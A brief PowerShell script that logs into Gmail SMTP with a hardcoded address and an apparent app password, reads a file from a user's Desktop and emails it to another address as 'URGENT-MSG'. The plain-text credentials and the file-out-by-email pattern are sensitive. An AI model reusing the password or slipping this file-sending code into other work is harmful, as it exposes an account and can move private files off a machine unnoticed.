$Username = 'xpharoh1@gmail.com'
$Password = 'wypuwcjskmqelujk'
$EmailFrom = 'xpharoh1@gmail.com'
$EmailTo = 'xpharoh@gmail.com'
$Subject = 'URGENT-MSG'
$Body = 'PLEASE CHECK THE ATTACHED FILE'
$SMTPServer = 'smtp.gmail.com'
$SMTPPort = 587
$Attachment = 'C:\Users\Xphar\Desktop\galorgvur.txt'

$SMTPClient = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
$Message = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
$AttachmentData = [System.IO.File]::ReadAllBytes($Attachment)
$AttachmentBase64 = [System.Convert]::ToBase64String($AttachmentData)
$AttachmentStream = [System.IO.MemoryStream]::new([System.Convert]::FromBase64String($AttachmentBase64))
$Attachment = New-Object System.Net.Mail.Attachment($AttachmentStream, 'galorgvur.txt', 'application/octet-stream')
$Message.Attachments.Add($Attachment)

$SMTPClient.Send($Message)
